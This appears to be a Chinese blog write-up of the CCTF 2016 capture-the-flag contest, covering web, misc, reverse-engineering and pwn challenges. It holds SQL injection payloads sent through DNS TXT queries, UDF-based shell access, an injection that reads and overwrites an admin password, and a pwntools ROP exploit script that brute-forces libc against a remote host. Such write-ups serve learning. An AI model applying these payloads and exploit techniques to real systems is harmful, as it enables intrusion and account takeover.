+<p>Get Hint!<br/>找到了ns.loli.club之后试了下不存在域传送漏洞。<br/>再试了下A记录AAAA记录 TXT 记录  P.S. RR也说了不滋瓷其它记录<br/>发现pocky.loli.club的 TXT 记录返回 “GOGOGO”<br/>所以猜想应该TXT记录放在mysql的一个字段里面了。<br/>查询条件是txt 还有 domain<br/>然后把这道题变成了常规web注入<br/><figure class="highlight less"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">dig <span class="variable">@ns</span>.loli.club -t txt <span class="string">"pocky.loli.club'&amp;&amp;if(mid(version(),1,1)=5,1,0)#"</span></div><div class="line"></div><div class="line">dig <span class="variable">@ns</span>.loli.club -t txt <span class="string">"pocky.loli.club'&amp;&amp;if(mid(version(),1,1)=6,1,0)#"</span></div></pre></td></tr></table></figure></p>
+<p>结果证实注入存在。<br/>union注入找到<br/>dns数据库下只有一张hosts表<br/>hosts表下只有七条记录都没有什么有用的信息。<br/>所以就是get system shell.<br/>开始无脑地缩短payload<br/>发现<br/><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">dig @ns.loli.club -t txt "'union(<span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">name</span> <span class="keyword">from</span> mysql.func <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">3</span>,<span class="number">4</span>)#<span class="string">"</span></div></pre></td></tr></table></figure></p>
+<p>返回sYsT3m_e<br/>贴心的出题人Ricter关爱 Web 狗把UDF都种好了。<br/><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">dig @ns.loli.club -t txt "'union(<span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> <span class="keyword">name</span> <span class="keyword">from</span> mysql.func <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>),<span class="number">3</span>,<span class="number">4</span>)#<span class="string">"</span></div></pre></td></tr></table></figure></p>
+<p>只有一个func,够了。然后一头撞在了缩短payload的墙上。<br/>二狗告我为什么不down 回脚本，智障一。<br/>然后我喊了一声我要拿一血。立flag…<br/>反弹shell之后，find / -name flag 智障二。<br/>然后没找到懵逼。 试了其它，也没有。就一个一个手动切目录。<br/>找到flag放在了FLAG文件里面。<br/>第三只萝莉捕获完毕。</p>
+<h3 id="萝莉4"><a class="headerlink" href="#萝莉4" title="萝莉4"></a>萝莉4</h3><p>RR说这是最容易的，还说帮大家装好了nmap了。</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">/etc/hosts</div><div class="line"><span class="number">127.0.0.1</span> localhost</div><div class="line"><span class="number">127.0.1.1</span>	localhost.localdomain	localhost</div><div class="line"></div><div class="line"># The following lines are desirable for IPv6 capable hosts</div><div class="line"><span class="number">::1</span>     localhost ip6-localhost ip6-loopback</div><div class="line"><span class="number">ff02::1</span> ip6-allnodes</div><div class="line"><span class="number">ff02::2</span> ip6-allrouters</div><div class="line"><span class="number">10.47.111.200</span> dns</div></pre></td></tr></table></figure>
+<p>nmap跑起来把/21的都跑了一遍，继续缩小目标。</p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"> arp -a</div><div class="line">? (120.27.151.247) at 3c:<span class="number">8</span><span class="string">c:</span><span class="number">40</span>:<span class="number">4</span><span class="string">e:</span><span class="string">dd:</span><span class="number">46</span> [ether] on eth1</div><div class="line">? (10.47.111.247) at 3c:<span class="number">8</span><span class="string">c:</span><span class="number">40</span>:<span class="number">4</span><span class="string">e:</span><span class="string">dd:</span><span class="number">46</span> [ether] on eth0</div><div class="line">? (10.47.111.187) at 00:<span class="number">16</span>:<span class="number">3</span><span class="string">e:</span><span class="number">01</span>:<span class="number">02</span>:<span class="number">8</span>b [ether] on eth0</div><div class="line">? (10.47.110.23) at 00:<span class="number">16</span>:<span class="number">3</span><span class="string">e:</span><span class="number">01</span>:<span class="number">03</span>:<span class="number">33</span> [ether] on eth0</div><div class="line"></div><div class="line"></div><div class="line"><span class="number">10.47</span><span class="number">.111</span><span class="number">.187</span>开了<span class="number">8080</span>和和<span class="number">80</span></div><div class="line"><span class="number">8080</span>/tcp open  http    nginx <span class="number">1.4</span><span class="number">.6</span> (Ubuntu)</div><div class="line">|_http-<span class="string">methods:</span> No Allow or Public header <span class="keyword">in</span> OPTIONS response (status code <span class="number">405</span>)</div><div class="line">|_http-open-<span class="string">proxy:</span> Proxy might be redirecting requests</div><div class="line">|_http-<span class="string">title:</span> OPS - LOLI.CLUB</div><div class="line"><span class="number">1</span> service unrecognized despite returning data. If you know the service<span class="regexp">/version, please submit the following fingerprint at http:/</span><span class="regexp">/www.insecure.org/</span>cgi-bin/servicefp-submit.<span class="string">cgi :</span></div><div class="line">SF-Port22-<span class="string">TCP:</span>V=<span class="number">6.40</span>%I=<span class="number">7</span>%D=<span class="number">4</span>/<span class="number">24</span>%Time=<span class="number">571</span>C607D%P=x86_64-pc-linux-gnu%r(NULL</div><div class="line"><span class="string">SF:</span>,<span class="number">29</span>,<span class="string">"SSH-2\.0-OpenSSH_6\.6\.1p1\x20Ubuntu-2ubuntu2\r\n"</span>);</div><div class="line">Service <span class="string">Info:</span> <span class="string">OS:</span> Linux; <span class="string">CPE:</span> <span class="string">cpe:</span>/<span class="string">o:</span><span class="string">linux:</span>linux_kernel</div><div class="line"></div><div class="line"></div><div class="line"><span class="number">80</span>/tcp   open  http    nginx <span class="number">1.4</span><span class="number">.6</span> (Ubuntu)</div><div class="line">|_http-<span class="string">methods:</span> No Allow or Public header <span class="keyword">in</span> OPTIONS response (status code <span class="number">405</span>)</div><div class="line">|_http-<span class="string">title:</span> <span class="number">404</span> Not Found</div></pre></td></tr></table></figure>
+<p>内网嗯。。上了个s5代理。<br/>然后在forget?(找回密码)处发现了注入。<br/>学长发现可以sqlmap跑，但有点卡。<br/>然后就手注了。</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="section">email</span>=********%<span class="number">40</span>qq.com') union select updatexml(<span class="number">0</span>,concat(<span class="number">0x27</span>,(select column_name from information_schema.columns where table_name='user' limit <span class="number">7</span>,<span class="number">1</span>)),<span class="number">0</span>)%<span class="number">23</span></div></pre></td></tr></table></figure>
+<p>user表  好多列。。想想我们的目标是admin的密码<br/>然后<br/>select password from user where username=’<em>*</em>‘<br/>这里坑了一下，因为出来的密码直接复制出来，update回去，但失败了。<br/>因为出来的密码看着像是md5但其实只有31位。<br/>为什么会这样子呢？<br/>显错注入有长度限制。其实密码hash后完整长度超过了这个。<br/>然后就分两段截取了出来。</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">email=<span class="strong">*****</span><span class="strong">***%40qq.com'); update user set password='**</span><span class="strong">*****</span><span class="emphasis">***</span>';%23</div></pre></td></tr></table></figure>
+<p>然后以admin登陆，flag就在眼前。</p>
+<p>四只萝莉捕获完毕。</p>
+<h1 id="misc"><a class="headerlink" href="#misc" title="misc"></a>misc</h1><h2 id="签个到"><a class="headerlink" href="#签个到" title="签个到"></a>签个到</h2><p>没什么可说的，F12审查元素就看到了..</p>
+<h2 id="Best-Easy-Misc"><a class="headerlink" href="#Best-Easy-Misc" title="Best_Easy_Misc"></a>Best_Easy_Misc</h2><p>Morse解码一下。得到只有0和9的字符共 1024 个。<br/>32 * 32 = 1024<br/>把字符替换下然后打印出来。<br/>发现水平翻转了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"></div><div class="line">output = <span class="string">'0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000099990099999900000000000000000009000090000000090000900000000000000000000000000099099000000000000000000000000000009000000000000009009000000990000000000000000000090909009009090000000000000000000909090090090900009090000000000009090900900909000090900000000000090909009009090000909000000000000999900099999000099990000000000000000000000000000000000000000000000000009000090000000000000000000900090009009000000090000000000009000900009900000000900000000000090009000099000009999000000000000099900009009000000090000000000000000000900009000000900000000000000000000000000000000000000000000999909000000000000000000000000000000000099990900900900000000000000000000000000009009000000000000099999000009900099990000000000000090000000900900000000000000000000090000009009000000000000000000000090000090090090090000000000000999990099999900900900000000000000000000000000009999'</span></div><div class="line">output = output.replace(<span class="string">'0'</span>, <span class="string">' '</span>)</div><div class="line">output = output.replace(<span class="string">'9'</span>, <span class="string">'#'</span>)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, len(output), <span class="number">32</span>):</div><div class="line">        <span class="keyword">print</span> output[j:j+<span class="number">32</span>][::<span class="number">-1</span>]</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure>
+<h2 id="True-or-False"><a class="headerlink" href="#True-or-False" title="True or False?"></a>True or False?</h2><p>True or False?</p>
+<p>Hint：这是一个压缩文件</p>
+<hr/>
+<p>拿到文件后，发现并不能认出是啥文件，根据提示说是压缩文件，搜了一些压缩文件格式的magic number，有点像bz2，只是前两个字节调换了一下位置。<br/><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">hex</div><div class="line">Offset      <span class="number">0</span>  <span class="number">1</span>  <span class="number">2</span>  <span class="number">3</span>  <span class="number">4</span>  <span class="number">5</span>  <span class="number">6</span>  <span class="number">7</span>   <span class="number">8</span>  <span class="number">9</span>  A  B  C  D  E  F</div><div class="line"></div><div class="line"><span class="number">00000000</span>   <span class="number">5</span>A <span class="number">42</span> <span class="number">68</span> <span class="number">39</span> <span class="number">31</span> <span class="number">41</span> <span class="number">59</span> <span class="number">26</span>  <span class="number">53</span> <span class="number">59</span> <span class="number">82</span> D2 <span class="number">45</span> B8 <span class="number">00</span> <span class="number">16</span>   ZBh91AY&amp;SY‚ÒE¸</div></pre></td></tr></table></figure></p>
+<p>调换后，可以直接解压，是tar.bz2的压缩格式。解压后有两个文件True和False，丢到IDA里去。</p>
+<p>两个文件都执行了命令，但是跟flag毫无关系，但是true文件中发现了一个print_f函数企图蒙混过关。<br/><figure class="highlight nginx"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">c</span></div><div class="line">v14 = <span class="string">"yvahk-enva"</span>;</div><div class="line"><span class="attribute">v1</span> = <span class="string">'P'</span>;</div><div class="line"><span class="attribute">v2</span> = <span class="string">'P'</span>;</div><div class="line"><span class="attribute">v3</span> = <span class="string">'G'</span>;</div><div class="line"><span class="attribute">v4</span> = <span class="string">'S'</span>;</div><div class="line"><span class="attribute">v5</span> = <span class="string">'{'</span>;</div><div class="line"><span class="attribute">v6</span> = <span class="string">'\0'</span>;</div><div class="line"><span class="attribute">v7</span> = <span class="string">'-'</span>;</div><div class="line"><span class="attribute">v8</span> = <span class="string">'o'</span>;</div><div class="line"><span class="attribute">v9</span> = <span class="string">'v'</span>;</div><div class="line"><span class="attribute">v10</span> = <span class="string">'a'</span>;</div><div class="line"><span class="attribute">v11</span> = <span class="string">'}'</span>;</div><div class="line"><span class="attribute">v13</span> = <span class="string">'\f'</span>;</div><div class="line"><span class="attribute">v12</span> = <span class="number">0</span>;</div><div class="line"><span class="attribute">return</span> printf(<span class="string">"%s%s%s\n"</span>, &amp;v1, <span class="string">"yvahk-enva"</span>, &amp;v7);</div></pre></td></tr></table></figure></p>
+<p>组合出字符串：PPGS{yvahk-enva-ova}，ROT13即可得到flag：CCTF{linux-rain-bin}</p>
+<h2 id="EZ-Game"><a class="headerlink" href="#EZ-Game" title="EZ Game"></a>EZ Game</h2><p>流量分析<br/>先不打开wireshark,直接strings得到开头有一串奇怪的字符<br/><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">echo</span> <span class="string">"Q0NURntkb195b3VfbGlrZV9zbmlmZmVyfQ=="</span> | base64 <span class="_">-d</span></div><div class="line">CCTF{do_you_like_sniffer}<span class="comment">#</span></div></pre></td></tr></table></figure></p>
+<p>福利题。<br/>结合题目要求，找出是哪个洞的exp过程。<br/>发现是get了cmd shell的，找找试试就好了。</p>
+<p>大名鼎鼎MS08067</p>
+<h1 id="Base-安码"><a class="headerlink" href="#Base-安码" title="Base{安码}"></a>Base{安码}</h1><h2 id="MISC1"><a class="headerlink" href="#MISC1" title="MISC1"></a>MISC1</h2><p>都说了新手福利，没什么可说的</p>
+<p>Stegsolve直接打开图片，然后查看data，解base64，有个空格的问题有点儿蛋疼，不过稍微改改，改成有意义的就可以了</p>
+<h2 id="MISC2"><a class="headerlink" href="#MISC2" title="MISC2"></a>MISC2</h2><p>下载下来是个数据包，稍微翻翻呗，比较简单，没记错是在http包中明码传的flag，稍微找找就好了。</p>
+<h2 id="re1"><a class="headerlink" href="#re1" title="re1"></a>re1</h2><p>新手福音，业界良心。</p>
+<p>flag提交格式：</p>
+<p>CCTF{flag}</p>
+<p>hint：flag是你的解出来的哇</p>
+<hr/>
+<p>直接丢去IDA，argc 需要大于3，前面的一大段代码都没什么用，直接看check函数：<br/><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">signed</span> <span class="keyword">int</span> <span class="number">__</span><span class="function">cdecl <span class="title">check</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></div><div class="line">{</div><div class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [sp+Ch] [bp-4h]@1</span></div><div class="line"></div><div class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i )</div><div class="line">  {</div><div class="line">    <span class="keyword">if</span> ( a1[i] != *(i + <span class="number">0x8048C80</span>) )</div><div class="line">      <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">  }</div><div class="line">  <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">}</div></pre></td></tr></table></figure></p>
+<p>把输入的字符串和0x8048c80这个地址的内容去比较，而这个地址的内容是：<br/><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">.rodata:08048C80 aF2332291a6e1e6 db 'f2332291a6e1e6154f3cf4ad8b7504d8',0</div></pre></td></tr></table></figure></p>
+<p>所以直接执行程序：<br/><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">➜  cctf  ./buffer32 f2332291a6e1e6154f3cf4ad8b7504d8 f2332291a6e1e6154f3cf4ad8b7504d8 f2332291a6e1e6154f3cf4ad8b7504d8</div><div class="line">Aleph-One</div><div class="line">Is The Password.  Good Job !</div></pre></td></tr></table></figure></p>
+<h2 id="re2"><a class="headerlink" href="#re2" title="re2"></a>re2</h2><p>新手福音，业界良心。</p>
+<p>flag提交格式：</p>
+<p>CCTF{flag}</p>
+<hr/>
+<p>.net写的，直接上Reflector。<br/>程序连接到127.0.0.1的31337端口，然后把flag发了过来。<br/>本地监听一下这个端口，然后运行程序就可以了。<br/><figure class="highlight powershell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">PS C:\Users\lightless\Desktop\PowerCat&gt; <span class="built_in">Import-Module</span> .\PowerCat.psd1</div><div class="line">PS C:\Users\lightless\Desktop\PowerCat&gt; start-powercat -port <span class="number">31337</span></div><div class="line">CTF{<span class="number">7</span>eb67b0bb4427e0b43b40b6042670b55}</div></pre></td></tr></table></figure></p>
+<h2 id="re3"><a class="headerlink" href="#re3" title="re3"></a>re3</h2><p>这个其实没什么好写的.<br/><img alt="" src="./CCTF2016_writeup  LoRexxar's Blog/re3.jpg"/></p>
+<p>用od在strcmp的地方下断点。直接跑就可以了。等断在断点之后就直接在栈上看到flag了。</p>
+<p>因为太简单反而怀疑了一阵子Orz</p>
+<h1 id="BIN"><a class="headerlink" href="#BIN" title="BIN"></a>BIN</h1><h2 id="2048？4096？"><a class="headerlink" href="#2048？4096？" title="2048？4096？"></a>2048？4096？</h2><p>hint1:2048?4096? Hint: 他们说玩到2048并不厉害，玩到4096的也不厉害，不信你先逆一下<br/>hint2:2048？4096？ Hint：真的是分数越高的越厉害？ 2016年4月23日16:07<br/>hint3:2048？4096？ Hint3：好吧，咱看谁分数最低。。。。。。。。。。。。 2016年4月23日18:08</p>
+<p>那么就是找出理论最低分咯</p>
+<p><a href="https://www.zhihu.com/question/23073587" rel="external" target="_blank">https://www.zhihu.com/question/23073587</a></p>
+<p>这样一来理论最低分就是16分了，那么理论最低步数呢，不知道….<br/>没办法，跑跑看吧，最后跑出来是22步（哪位大牛告诉我为什么啊？）</p>
+<h2 id="Difffffffffuse"><a class="headerlink" href="#Difffffffffuse" title="Difffffffffuse"></a>Difffffffffuse</h2><p>让我来讲个故事</p>
+<p>我把这道题叫做：一柱擎天</p>
+<p>第一次打开这题：什么玩意，估计是一个虚拟机或者平坦化，代码长的一柱擎天。</p>
+<p>觉得这题完全没法做，打开了游戏，半小时过去了。。。。。队友跟我说这题有人DONE了。我想怎么可能，这种东西不可能那么快做出来的，于是又把它捡了起来。<br/><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">.text:</span>080BB877                 <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esp</span>+<span class="number">8</span>], <span class="number">28h</span> <span class="comment">; n</span></div><div class="line"><span class="symbol">.text:</span>080BB87F                 <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">esp</span>+<span class="number">14h</span>]</div><div class="line"><span class="symbol">.text:</span>080BB883                 <span class="keyword">mov</span>     [<span class="built_in">esp</span>+<span class="number">4</span>], <span class="built_in">eax</span>    <span class="comment">; s2</span></div><div class="line"><span class="symbol">.text:</span>080BB887                 <span class="keyword">lea</span>     <span class="built_in">eax</span>, [<span class="built_in">esp</span>+<span class="number">3Dh</span>]</div><div class="line"><span class="symbol">.text:</span>080BB88B                 <span class="keyword">mov</span>     [<span class="built_in">esp</span>], <span class="built_in">eax</span>      <span class="comment">; s1</span></div><div class="line"><span class="symbol">.text:</span>080BB88E                 <span class="keyword">call</span>    _memcmp</div><div class="line"><span class="symbol">.text:</span>080BB893                 <span class="keyword">test</span>    <span class="built_in">eax</span>, <span class="built_in">eax</span></div><div class="line"><span class="symbol">.text:</span>080BB895                 <span class="keyword">jnz</span>     short loc_80BB8A5</div><div class="line"><span class="symbol">.text:</span>080BB897                 <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esp</span>], offset s <span class="comment">; "Yeap!!!"</span></div><div class="line"><span class="symbol">.text:</span>080BB89E                 <span class="keyword">call</span>    _puts</div><div class="line"><span class="symbol">.text:</span>080BB8A3                 <span class="keyword">jmp</span>     short loc_80BB8B1</div></pre></td></tr></table></figure></p>
+<p>可以看到memcmp对内存进行了比较，下断点发现可以进行爆破。</p>
+<p>需要的结果：<br/><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="number">0xffffcefd</span>:	<span class="number">0x83</span>	<span class="number">0xec</span>	<span class="number">0x5f</span>	<span class="number">0xa2</span>	<span class="number">0x93</span>	<span class="number">0xce</span>	<span class="number">0xe5</span>	<span class="number">0xfb</span></div><div class="line"><span class="number">0xffffcf05</span>:	<span class="number">0x5a</span>	<span class="number">0x17</span>	<span class="number">0x06</span>	<span class="number">0xff</span>	<span class="number">0x89</span>	<span class="number">0x2d</span>	<span class="number">0xd7</span>	<span class="number">0x6c</span></div><div class="line"><span class="number">0xffffcf0d</span>:	<span class="number">0xbe</span>	<span class="number">0xce</span>	<span class="number">0x8d</span>	<span class="number">0x6a</span>	<span class="number">0xb8</span>	<span class="number">0x15</span>	<span class="number">0x26</span>	<span class="number">0xfc</span></div><div class="line"><span class="number">0xffffcf15</span>:	<span class="number">0x84</span>	<span class="number">0x01</span>	<span class="number">0x94</span>	<span class="number">0x44</span>	<span class="number">0xf8</span>	<span class="number">0xd7</span>	<span class="number">0x23</span>	<span class="number">0x1c</span></div><div class="line"><span class="number">0xffffcf1d</span>:	<span class="number">0x4b</span>	<span class="number">0xc2</span>	<span class="number">0x31</span>	<span class="number">0x04</span>	<span class="number">0xa6</span>	<span class="number">0x33</span>	<span class="number">0x08</span>	<span class="number">0x57</span></div><div class="line"><span class="number">0xffffcf25</span>:	<span class="number">0x00</span>	<span class="number">0x00</span>	<span class="number">0x00</span>	<span class="number">0x00</span></div></pre></td></tr></table></figure></p>
+<p>然而我并不会Linux的Patch，只能自己人肉爆破ORZ。</p>
+<p>分别填入40个1到10，小写的a到z,下划线，进行比较，获得了这样子的东西：</p>
+<p>CCTF{1F<em>?0u</em>?4n?a_?3v?n93<strong>_</strong>purpleroc}</p>
+<p>可以猜出来，第一个大写字母组成的单词是You，第二个由于我玩过I WANNA 也猜的出来，第三个搜一下?ev?nge找到了一个叫做复仇的影视剧。</p>
+<p>CCTF{1F_Y0u_W4nNa_R3vEn93<strong>_</strong>purpleroc}</p>
+<p>(ps:这也叫wp？？？？？？)</p>
+<h2 id="pwn1"><a class="headerlink" href="#pwn1" title="pwn1"></a>pwn1</h2><p>所以说这题的正解是啥？</p>
+<p>汇编代码本身不是很复杂。main函数的最后一个call ecx控制eip。同时可以控制跳转时栈参数8个字节。</p>
+<p>首先8个字节构造rop实在太少，所以需要先迁移栈。用ROPgadget找一下发现了</p>
+<blockquote>
+<p>0x08048662 : add byte ptr [eax], al ; lea esp, dword ptr [ebp - 0xc] ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret<br/>0x080486cb : sbb al, 0x5b ; pop esi ; pop edi ; pop ebp ; ret</p>
+</blockquote>
+<p>可以用<code>pop ebp,ret;lea esp, dword ptr [ebp - 0xc]</code>这样的形式来将栈迁移到任意的地址。这里直接将栈迁移到位于bss段的buffer缓冲区上。这样子rop的长度就足够了。</p>
+<p>但是程序很贱的关闭了标准输入的读，也就是说程序全程只有一次可以写入的机会。讲道理这样的题目出题人本意是用dl resolve来利用的。我也确实尝试用dl resolve写了个poc。本地确实成功了。但是远程打的时候直接GG。</p>
+<p>既然正解不成，就只能投机取巧了</p>
+<p>首先，因为没给so库。所以先要知道so库的版本。这个还好说。因为rop够长，所以可以做到任意地址读。从got表中leak出两个函数的地址求个差比对一下大概就能知道so库的版本了。</p>
+<p>然后是绕过aslr。这个没什么办法，还好程序是32位的。libc的加载基地址只有0x100中可能。所以直接盲跳libc。实际测试下来，基本上400尝试之内都能出结果。</p>
+<p>最后一个问题是调用system直接程序就终止了。实际gdb调试结果是栈迁移后的栈太小，不足以system使用的原因。无奈只能改成用execv函数。还好可以直接在bss段构造命令行参数，所以问题不大。</p>
+<p>最后的脚本如下<br/><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div></pre></td><td class="code"><pre><div class="line">#! /usr/bin/python</div><div class="line">import pwn</div><div class="line"></div><div class="line">pwn.context.log_level = &amp;apos;debug&amp;apos;</div><div class="line">binary = pwn.ELF(&amp;apos;/tmp/pwn1&amp;apos;)</div><div class="line">libc = pwn.ELF(&amp;apos;/tmp/libc.so.6&amp;apos;)</div><div class="line">showdown = 0x08048426</div><div class="line"></div><div class="line">sh = 0x0804A060 + 0x70</div><div class="line"></div><div class="line">pay = &amp;apos;134514276.134520956.134514383.aa&amp;apos;</div><div class="line">cmd = "/bin/cat\x00\x00"</div><div class="line">null = sh + len(cmd)</div><div class="line"></div><div class="line"></div><div class="line">def main(system, target):</div><div class="line">    def getRop():</div><div class="line">        rop = pwn.ROP(binary)</div><div class="line">        rop.call(system, (sh, null))</div><div class="line">        return str(rop)</div><div class="line"></div><div class="line">    # pwn.gdb.attach(target)</div><div class="line">    # raw_input("debuger")</div><div class="line">    target.recv()</div><div class="line">    rop = getRop()</div><div class="line">    target.sendline(pay+rop+&amp;apos;a&amp;apos;*(0x70-len(rop+pay))+cmd+pwn.p32(sh+len(cmd)+12)+pwn.p32(sh+len(cmd)+12+4)+"\x00"*4+&amp;apos;cat\x00&amp;apos;+&amp;apos;flag&amp;apos;+&amp;apos;\x00&amp;apos; * 4)</div><div class="line">    # target.recv()</div><div class="line">    try:</div><div class="line">        a = target.recv()</div><div class="line">    except EOFError:</div><div class="line">        return</div><div class="line">    # target.interactive()</div><div class="line">    print a</div><div class="line">    exit(0)</div><div class="line"></div><div class="line"></div><div class="line"># pwn.gdb.attach(target)</div><div class="line"># system = raw_input("system:")</div><div class="line"># system = int(system,16) + libc.symbols[&amp;apos;execv&amp;apos;]</div><div class="line"># system = 0x00040190</div><div class="line">for i in range(10000):</div><div class="line">    print i</div><div class="line">    try:</div><div class="line">        #target = pwn.process(&amp;apos;/tmp/pwn1&amp;apos;)</div><div class="line">        target = pwn.remote(&amp;apos;115.28.241.138&amp;apos;, 9000, timeout=1)</div><div class="line">    except:</div><div class="line">        continue</div><div class="line">    base = 0xb7574000</div><div class="line">    system = base + 0x000b5d20</div><div class="line">    # pwn.gdb.attach(target)</div><div class="line">    # system = raw_input("system:")</div><div class="line">    # system = int(system, 16) + libc.symbols[&amp;apos;execv&amp;apos;]</div><div class="line">    main(system, target)</div><div class="line">    target.close()</div></pre></td></tr></table></figure></p>
+<p>还好服务器网速不错Orz</p>
+<h2 id="pwn2"><a class="headerlink" href="#pwn2" title="pwn2"></a>pwn2</h2><p>程序很简单。用mmap给了一整片可读可写可执行的“新大陆”</p>
+<p>问题是整么登上新大陆呢？</p>
+<p>首先是能够输入5个字节的shellcode然后跳转到shellcode执行。这5个字节的shellcode就是关键的地方了。再经过2个小时的无数脑洞之后，最后想到的shellcode是这个<br/><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">mov</span>     <span class="built_in">byte</span>[<span class="built_in">esp</span>],<span class="number">0xd2</span></div><div class="line"><span class="keyword">ret</span></div></pre></td></tr></table></figure></p>
